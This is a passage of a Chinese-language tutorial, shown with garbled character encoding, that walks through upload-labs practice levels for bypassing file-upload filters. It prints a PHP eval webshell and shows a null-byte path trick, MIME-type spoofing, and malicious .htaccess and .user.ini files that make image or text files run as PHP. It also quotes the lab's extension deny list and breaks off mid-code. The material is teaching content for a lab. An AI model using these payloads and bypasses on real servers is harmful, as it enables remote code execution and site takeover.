æ—¶ä½¿ç”¨burpæŠ“åŒ…,å¦‚ä¸‹</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021822079.png"></p><p>2ã€ä¿®æ”¹æ–‡ä»¶ä¿å­˜è·¯å¾„å’Œæ–‡ä»¶å</p><p>æœ€åˆçš„ä¿å­˜è·¯å¾„æ˜¯ ..&#x2F;upload&#x2F;,æ–‡ä»¶åæ˜¯ aa.php,æ‰€ä»¥ç»è¿‡æ‹¼æ¥å aa.phpä¸Šä¼ åçš„ç›¸å¯¹è·¯å¾„ä½ç½®æ˜¯ ..&#x2F;upload&#x2F;aa.php<br>æ­¤æ—¶æˆ‘ä»¬å°†æ–‡ä»¶æŠ¥é”™è·¯å¾„ä¿®æ”¹ä¸ºâ€œ..&#x2F;upload&#x2F;test.php%00aa.phpâ€ã€‚%00æ˜¯ç»“æŸç¬¦çš„urlç¼–ç æ ¼å¼</p><p>æ–‡ä»¶åä¿®æ”¹ä¸ºâ€œaa.jpgâ€ï¼Œå¦‚ä¸‹</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021823275.png"></p><p>æ­¤æ—¶æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶æœ€åçš„è·¯å¾„å°±ä¼šæ‹¼æ¥æˆä¸ºâ€”â€”â€œ..&#x2F;upload&#x2F;test.php%00aa.jpgâ€ï¼Œå› ä¸ºè¿‡æ»¤è§„åˆ™åªå¯¹æ–‡ä»¶åç”Ÿæ•ˆï¼Œä¹Ÿå°±æ˜¯filenameå‚æ•°å¯¹åº”çš„â€œaa.jpgâ€ï¼Œç›®æ ‡å…è®¸jpgæ–‡ä»¶ä¸Šä¼ ï¼Œæ‰€ä»¥ç»•è¿‡è¿‡æ»¤è‡ªç„¶æ˜¯æ²¡æœ‰é—®é¢˜çš„</p><p>å¾ˆå¤šäººä¼šé—®ï¼Œé‚£æˆ‘ä»¬ä¸Šä¼ çš„aa.phpä¸­çš„ä¸€å¥è¯æœ¨é©¬å†…å®¹åœ¨å“ªå»äº†ï¼Ÿè‡ªç„¶ä¹Ÿå°±æ˜¯åœ¨test.phpé‡Œé¢å»äº†ã€‚å› ä¸º%00åé¢çš„è¯­å¥ä¸ä¼šè¢«è¯†åˆ«ï¼Œæ‰€ä»¥èƒ½æˆåŠŸä¸Šä¼ ï¼Œå†…å®¹ä¹ŸæˆåŠŸè§£æä¸ºphp<br>æ­¤æ—¶è®¿é—®test.phpå°±èƒ½æˆåŠŸè®¿é—®æˆ‘ä»¬ä¸Šä¼ çš„phpæ–‡ä»¶å†…å®¹</p><h2 id="é¶åœºç»ƒä¹ -1"><a href="#é¶åœºç»ƒä¹ -1" class="headerlink" title="é¶åœºç»ƒä¹ "></a>é¶åœºç»ƒä¹ </h2><h3 id="Pass-01-ç¦ç”¨JS"><a href="#Pass-01-ç¦ç”¨JS" class="headerlink" title="Pass-01-ç¦ç”¨JS"></a>Pass-01-ç¦ç”¨JS</h3><p>ç›®æ ‡ï¼šç»•è¿‡æ–‡ä»¶ä¸Šä¼ é™åˆ¶ï¼ŒæˆåŠŸä¸Šä¼ ä¸€ä¸ªwebshell(æ˜¯ä¸€ç§æ¶æ„è„šæœ¬æˆ–ç¨‹åº)å¹¶æ‰§è¡Œã€‚</p><p>åˆ›å»ºä¸€ä¸ª PHP æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021823877.png"></p><p>å°è¯•ä¸Šä¼ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021823380.png"></p><p>åˆ†æä»£ç è¿™æ˜¯ä¸€ä¸ªjsæ‹¦æˆª</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">checkFile</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> file = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByName</span>(<span class="hljs-string">&#x27;upload_file&#x27;</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">value</span>;<br>    <span class="hljs-keyword">if</span> (file == <span class="hljs-literal">null</span> || file == <span class="hljs-string">&quot;&quot;</span>) &#123;<br>        <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-comment">//å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹</span><br>    <span class="hljs-keyword">var</span> allow_ext = <span class="hljs-string">&quot;.jpg|.png|.gif&quot;</span>;<br>    <span class="hljs-comment">//æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹</span><br>    <span class="hljs-keyword">var</span> ext_name = file.<span class="hljs-title function_">substring</span>(file.<span class="hljs-title function_">lastIndexOf</span>(<span class="hljs-string">&quot;.&quot;</span>));<br>    <span class="hljs-comment">//åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ </span><br>    <span class="hljs-keyword">if</span> (allow_ext.<span class="hljs-title function_">indexOf</span>(ext_name + <span class="hljs-string">&quot;|&quot;</span>) == -<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">var</span> errMsg = <span class="hljs-string">&quot;è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ &quot;</span> + allow_ext + <span class="hljs-string">&quot;ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š&quot;</span> + ext_name;<br>        <span class="hljs-title function_">alert</span>(errMsg);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ–¹æ³•ä¸€ï¼šç›´æ¥ç¦ç”¨æµè§ˆå™¨çš„js</p><p>ï¼ˆ1ï¼‰ç«ç‹ï¼šåœ°å€æ è¾“å…¥about:config<br>            æœç´¢æ æœjavascript.enabled<br>ä¸ºtureæ˜¯ä¸ºå¼€å¯JavaScriptä¸ºfalseæ—¶ä¸ºå…³é—­JavaScript</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021824428.png"></p><p>ï¼ˆ2ï¼‰å³é”®â€”æ£€æŸ¥â€”è°ƒè¯•å™¨â€”è®¾ç½®â€”ç¦ç”¨JavaScript</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021824981.png"></p><p>ï¼ˆ3ï¼‰æ‰©å±•</p><p>æ–¹æ³•äºŒï¼šåˆ é™¤checkFile()å‡½æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021824911.png"></p><p>æµ‹è¯•æˆåŠŸï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021824460.png"></p><h3 id="Pass-02-MIMEç±»å‹"><a href="#Pass-02-MIMEç±»å‹" class="headerlink" title="Pass-02-MIMEç±»å‹"></a>Pass-02-MIMEç±»å‹</h3><p>MIMEç±»å‹ï¼šæµè§ˆå™¨é€šè¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">$_FILES[&#x27;file&#x27;][&#x27;type&#x27;]<br></code></pre></td></tr></table></figure><p>å‘é€æ–‡ä»¶çš„MIMEç±»å‹(å¦‚image&#x2F;jpeg)ï¼Œä½†å®Œå…¨ç”±å®¢æˆ·ç«¯æ§åˆ¶ï¼Œæ”»å‡»è€…å¯é€šè¿‡ä¿®æ”¹ HTTP è¯·æ±‚ä¼ªé€ æ­¤å€¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/jpeg&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/png&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/gif&#x27;</span>)) &#123;<span class="hljs-comment">//</span><br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]            <br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨burpæŠ“åŒ…</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021824258.png"></p><p>ä¿®æ”¹content-type(æ˜¯å‘æœåŠ¡å™¨å‘ŠçŸ¥ä¼ è¾“çš„æ˜¯ä»€ä¹ˆæ–‡ä»¶)</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021824502.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021824618.png"></p><p>å¤åˆ¶å›¾ç‰‡é“¾æ¥</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021824618.png"></p><p>éªŒè¯é€šè¿‡</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021825147.png"></p><h3 id="Pass-03-åç¼€ä¼ªé€ ç»•è¿‡"><a href="#Pass-03-åç¼€ä¼ªé€ ç»•è¿‡" class="headerlink" title="Pass-03-åç¼€ä¼ªé€ ç»•è¿‡"></a>Pass-03-åç¼€ä¼ªé€ ç»•è¿‡</h3><h6 id="å‰ç½®æ¡ä»¶ï¼š"><a href="#å‰ç½®æ¡ä»¶ï¼š" class="headerlink" title="å‰ç½®æ¡ä»¶ï¼š"></a>å‰ç½®æ¡ä»¶ï¼š</h6><p>1.åˆ‡æ¢ç‰ˆæœ¬</p><p><a href="https://blog.csdn.net/qq_43696276/article/details/126445465">è®°å½•BUGâ€”åœ¨uploadlabsç¬¬ä¸‰å…³ä¸­â€”å…³äºphpstudyä¸­ä¿®æ”¹httpd.confä¾æ—§æ— æ³•è§£æ.php3dç­‰é—®é¢˜_upload-labsæ— æ³•è§£æphp3-CSDNåšå®¢</a></p><p>ä¿®æ”¹åç¼€æ¥ç»•è¿‡æ£€æŸ¥ï¼Œä¾‹å¦‚ä¿®æ”¹ä¸ºâ€.php3â€,â€.php5â€</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021825852.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021825443.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021825722.png"></p><h3 id="Pass-04-htaccess-é…ç½®è§£æç»•è¿‡"><a href="#Pass-04-htaccess-é…ç½®è§£æç»•è¿‡" class="headerlink" title="Pass-04-.htaccess é…ç½®è§£æç»•è¿‡"></a>Pass-04-<code>.htaccess</code> é…ç½®è§£æç»•è¿‡</h3><h6 id="å‰ç½®æ¡ä»¶ï¼š-1"><a href="#å‰ç½®æ¡ä»¶ï¼š-1" class="headerlink" title="å‰ç½®æ¡ä»¶ï¼š"></a>å‰ç½®æ¡ä»¶ï¼š</h6><p>1.<code>mod_rewrite</code>æ¨¡å—å¼€å¯ã€‚</p><p>ï¼ˆ1ï¼‰æ‰“å¼€<code>httpd.conf</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021825083.png"></p><p>ï¼ˆ2ï¼‰æ£€æŸ¥<code>#LoadModule rewrite_module modules/mod_rewrite.so</code>ï¼Œå»æ‰å‰é¢çš„<code>#</code></p><p>è‹¥æ²¡æœ‰<code>LoadModule rewrite_module modules/mod_rewrite.so</code>ï¼Œå¯ä»¥éšä¾¿æ‰¾ä¸€ä¸ªLoadModuleè¯­å¥çš„é™„è¿‘æ·»åŠ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021931287.png"></p><p>ï¼ˆ3ï¼‰ç¡®ä¿<code>mod_rewrite.so</code>æ–‡ä»¶å­˜åœ¨</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021931712.png"></p><p>ï¼ˆ4ï¼‰é…ç½®<code>.htaccess</code>æ”¯æŒ</p><p>æ‰“å¼€<code>httpd.conf</code>ï¼Œæœç´¢æ‰¾åˆ°<code>AllowOverride</code>ï¼Œå°†åé¢çš„NONEæ”¹ä¸ºALLï¼Œä¿é™©èµ·è§ï¼Œä¿©å¤„éƒ½æ”¹ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021931226.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021931817.png"></p><p>ï¼ˆ5ï¼‰åœ¨<code>httpd.conf</code>æ–‡ä»¶çš„æœ«å°¾æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼Œç¡®ä¿<code>RewriteEngine</code>å·²å¯ç”¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;IfModule mod_rewrite.c&gt;<br>    RewriteEngine On<br>&lt;/IfModule&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021931662.png"></p><p>ï¼ˆ6ï¼‰ä¿å­˜ï¼ï¼ï¼ä¿å­˜ï¼ï¼ï¼ä¿å­˜ï¼ï¼ï¼</p><p>ï¼ˆ7ï¼‰æµ‹è¯•</p><p>åœ¨ç½‘ç«™æ ¹ç›®å½•<code>www</code>ä¸‹åˆ›å»ºä¸€ä¸ª<code>.htaccess</code>æ–‡ä»¶ï¼Œå†™å…¥ä»¥ä¸‹å†…å®¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">RewriteEngine On<br>RewriteRule ^test$ index.php [L]<br></code></pre></td></tr></table></figure><p>ç„¶åè®¿é—®<code>http://åŸŸå/test</code>ï¼Œå¦‚æœè·³è½¬åˆ°<code>index.php</code>ï¼Œè¯´æ˜<code>mod_rewrite</code>å·²å¯ç”¨ã€‚</p><p>2.<code>.htaccess</code></p><p><code>.htaccess</code> æ˜¯ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œä¸»è¦ç”¨äº Apache æœåŠ¡å™¨ã€‚å®ƒæ”¾åœ¨ç½‘ç«™çš„æŸä¸ªç›®å½•é‡Œï¼Œç”¨æ¥æ§åˆ¶è¯¥ç›®å½•åŠå…¶å­ç›®å½•çš„è¡Œä¸ºã€‚</p><p>æ–°å»ºä¸€ä¸ª<code>.htaccess</code>æ–‡ä»¶ï¼Œæ³¨æ„ï¼š<strong>.htaccessæ–‡ä»¶ä¸èƒ½æœ‰æ–‡ä»¶åï¼Œå¦åˆ™ä¸è¿è¡Œï¼ï¼ï¼</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">AddType application/x-httpd-php .jpg .txt<br>//è¿™è¡Œä»£ç çš„æ„æ€æ˜¯è®©æœåŠ¡å™¨æŠŠ .jpg å’Œ .txt æ–‡ä»¶å½“ä½œ PHP è„šæœ¬æ¥æ‰§è¡Œã€‚<br>//AddType æ˜¯ .htaccess ä¸­çš„ä¸€ä¸ªæŒ‡ä»¤ï¼Œç”¨æ¥æŒ‡å®šæ–‡ä»¶ç±»å‹å’Œå¤„ç†æ–¹å¼ã€‚<br>//application/x-httpd-php æ˜¯ PHP æ–‡ä»¶çš„ MIME ç±»å‹ï¼Œè¡¨ç¤ºç”¨ PHP è§£æå™¨å¤„ç†è¿™äº›æ–‡ä»¶ã€‚<br>//.jpg .txt æ˜¯æ–‡ä»¶æ‰©å±•åï¼Œè¡¨ç¤ºå¯¹è¿™ä¸¤ç§æ–‡ä»¶åº”ç”¨è¯¥è§„åˆ™ã€‚<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021931923.png"></p><p>ä¸Šä¼ <code>.htaccess</code>æ–‡ä»¶</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021931269.png"></p><p>ä¹‹åä¸Šä¼ ä¸€å¥è¯æœ¨é©¬å›¾ç‰‡ï¼ˆå›¾ç‰‡å¯ä»¥ç›´æ¥ç”±phpæ–‡ä»¶æ”¹åç¼€åä¸ºjpgï¼‰</p><p>é“¾æ¥æˆåŠŸ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021931523.png"></p><h3 id="Pass-05-user-ini-è‡ªåŠ¨åŒ…å«ç»•è¿‡"><a href="#Pass-05-user-ini-è‡ªåŠ¨åŒ…å«ç»•è¿‡" class="headerlink" title="Pass-05- .user.ini è‡ªåŠ¨åŒ…å«ç»•è¿‡"></a>Pass-05- <code>.user.ini</code> è‡ªåŠ¨åŒ…å«ç»•è¿‡</h3><h6 id="å‰ç½®æ¡ä»¶ï¼š-2"><a href="#å‰ç½®æ¡ä»¶ï¼š-2" class="headerlink" title="å‰ç½®æ¡ä»¶ï¼š"></a>å‰ç½®æ¡ä»¶ï¼š</h6><p>1.<code>.user.ini</code> æ˜¯ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒç±»ä¼¼äº <code>.htaccess</code>ï¼Œä½†ä¸“é—¨ç”¨äºé…ç½® PHP çš„è¡Œä¸ºã€‚å¯ä»¥æŠŠå®ƒæ”¾åœ¨ç½‘ç«™çš„æŸä¸ªç›®å½•ä¸­ï¼Œç”¨æ¥è¦†ç›–æœåŠ¡å™¨çš„ä¸» PHP é…ç½®ï¼ˆ<code>php.ini</code>ï¼‰ï¼Œåœ¨ä¸ä¿®æ”¹æœåŠ¡å™¨å…¨å±€é…ç½®çš„æƒ…å†µä¸‹ï¼Œçµæ´»è°ƒæ•´ PHP çš„è¡Œä¸ºã€‚</p><p>2.åˆ‡æ¢ç‰ˆæœ¬</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021931309.png"></p><p>å†™ä¸€ä¸ª<code>.user.ini</code>é…ç½®æ–‡ä»¶ï¼Œä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">auto_prepend_file=1.txt<br>// PHP åœ¨æ‰§è¡Œæ¯ä¸ªè„šæœ¬ä¹‹å‰ï¼Œè‡ªåŠ¨é¢„åŠ è½½æŒ‡å®šçš„æ–‡ä»¶1.txtã€‚<br>å…·ä½“è§£é‡Š<br>auto_prepend_fileï¼šè¿™æ˜¯ä¸€ä¸ª PHP é…ç½®é€‰é¡¹ï¼Œç”¨äºæŒ‡å®šä¸€ä¸ªæ–‡ä»¶è·¯å¾„ã€‚PHP ä¼šåœ¨æ‰§è¡Œæ¯ä¸ªè„šæœ¬ä¹‹å‰ï¼Œå…ˆåŠ è½½å¹¶è¿è¡Œè¿™ä¸ªæ–‡ä»¶ã€‚<br>1.txtï¼šè¿™æ˜¯ä½ æŒ‡å®šçš„æ–‡ä»¶è·¯å¾„ã€‚PHP ä¼šå°è¯•åŠ è½½è¿™ä¸ªæ–‡ä»¶ï¼Œå¹¶å°†å…¶å†…å®¹ä½œä¸º PHP ä»£ç æ‰§è¡Œã€‚<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021932348.png"></p><p>å†ä¸Šä¼ ä¸€ä¸ª<code>1.txt</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021932332.png"></p><p>åœ¨èšå‰‘ä¸­è¾“å…¥urlæ—¶ï¼Œæœ€åä¸€é¡¹ä¸è¦å†™1.txtï¼Œè€Œæ˜¯readme.phpï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯é¶åœºè‡ªå¸¦çš„ä¸€ä¸ªphpæ–‡ä»¶ï¼Œè€Œä½ çš„.user.iniæ–‡ä»¶ä¸­å†™çš„å°±æ˜¯å¯åŠ¨phpæ–‡ä»¶çš„æ—¶å€™å¯åŠ¨1.txtï¼Œæ‰€ä»¥è¦å¯åŠ¨çš„æ˜¯readme.php</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021932536.png"></p><h3 id="Pass-06-å¤§å°å†™ç»•è¿‡"><a href="#Pass-06-å¤§å°å†™ç»•è¿‡" class="headerlink" title="Pass-06_å¤§å°å†™ç»•è¿‡"></a>Pass-06_å¤§å°å†™ç»•è¿‡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//é¦–å°¾å»ç©º</span><br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span 